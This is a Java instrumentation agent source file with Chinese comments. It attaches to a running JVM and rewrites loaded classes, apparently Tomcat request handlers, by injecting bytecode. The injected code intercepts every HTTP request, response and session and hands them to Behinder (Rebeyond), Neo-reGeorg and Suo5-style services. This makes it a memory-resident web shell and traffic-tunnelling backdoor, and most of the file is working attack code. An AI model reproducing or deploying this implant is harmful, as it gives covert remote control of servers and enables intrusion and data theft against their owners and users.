package indi.augusttheodor;

import com.sun.tools.attach.AgentInitializationException;
import com.sun.tools.attach.AgentLoadException;

import org.apache.catalina.core.RebeyondServices;
import org.apache.catalina.core.Suo5Services;

import java.io.IOException;
import java.lang.instrument.ClassDefinition;
import java.lang.instrument.Instrumentation;
import java.lang.instrument.UnmodifiableClassException;
import java.util.HashMap;

public class AgenstMain {

    public static void main(String[] args){
        //SB VSCODE 天天 吞我编码
        //我的注释！
        try{
            AttachA.doAttach(args.toString());
        } catch (AgentLoadException | IOException | AgentInitializationException e) {
            throw new RuntimeException(e);  //不打算处理但依然写了
        }

    }

    public static void premain(String agentArgs, Instrumentation ins){
        //这个方法作为agent时的入口
        System.out.println("hello111111");
        TransformerA.init();
        HashMap<String, String[]> hm = AttachA.findAttachClasses(); //懒得写注释了，要怪请怪VSCODE
        Class[] classes = ins.getAllLoadedClasses();
        //枚举所有已加载类，然后检查我们的注入器中是否包含这些
        for (Class c : classes) {
            if (hm.containsKey(c.getName())) {
                System.out.println("匹配到目标类！");;
                //如果包含呢，那就使用Transformer对其字节码进行注入
                for(String mN : hm.get(c.getName())){ //遍历列表取出所有要注入的方法
                    TransformerA tA = new TransformerA(mN,c.getName()); 
                    tA.setSourceCode("{System.out.println(\"Hello!\");}");
                    ins.addTransformer(tA, true);
                    try {
                        ins.retransformClasses(c);
                    } catch (UnmodifiableClassException e) {
                        System.out.println(mN+"------"+c.getName()+"------"+"不可注入！");
                    }
                }

            }
        }
        System.out.println("hello222222");
    }

    public static void agentmain(String agentArgs, Instrumentation ins){
        //这个方法作为agent时的入口
        System.out.println("hello1111112");
        TransformerA.init();
        HashMap<String, String[]> hm = AttachA.findAttachClasses(); //懒得写注释了，要怪请怪VSCODE
        Class[] classes = ins.getAllLoadedClasses();
        //枚举所有已加载类，然后检查我们的注入器中是否包含这些
        for (Class c : classes) {
            if (hm.containsKey(c.getName())) {
                System.out.println("匹配到目标类！");;
                //如果包含呢，那就使用Transformer对其字节码进行注入
                for(String mN : hm.get(c.getName())){ //遍历列表取出所有要注入的方法
                    TransformerA tA = new TransformerA(mN,c.getName());
                    tA.setSourceCode("{" +
                            "javax.servlet.http.HttpServletRequest request=(javax.servlet.http.HttpServletRequest)$1;\n" +
                            "javax.servlet.http.HttpServletResponse response = (javax.servlet.http.HttpServletResponse)$2;\n" +
                            "java.util.Map rdd=new java.util.HashMap();\n" +
                            "rdd.put(\"url\",request.getServletPath());\n" +
                            "rdd.put(\"method\",request.getMethod());\n" +
                            "rdd.put(\"b\",request.getReader().readLine());\n" +
                            "java.util.Map s=new java.util.HashMap();\n" +
                            "s.put(\"request\",request);\n" +
                            "s.put(\"response\",response);\n" +
                            "s.put(\"session\",request.getSession());" +
                            "org.apache.catalina.core.RebeyondServices.doServices(rdd,s);" +
                            "org.apache.catalina.core.ExtendServices.doServices(rdd,s);" +
                          //"org.apache.catalina.core.Suo5Services.doServices(rdd,s);" + //启用此功能需要重新编译，请看Suo5Services
                            "org.apache.catalina.core.NeoServices.doServices(rdd,s);" +
                            "}"); //前置，在被注入环境内获取所有需要的内容，然后进入agent环境
                    try {
                        ClassDefinition cd=new ClassDefinition(c, tA.getBytes(c));
                        ins.redefineClasses(cd);
                    } catch (UnmodifiableClassException e) {
                        System.out.println(mN+"------"+c.getName()+"------"+"不可注入！");
                    } catch (ClassNotFoundException e) {
                        throw new RuntimeException(e);
                    }
                }

            }
        }
        System.out.println("hello222222");
    }

}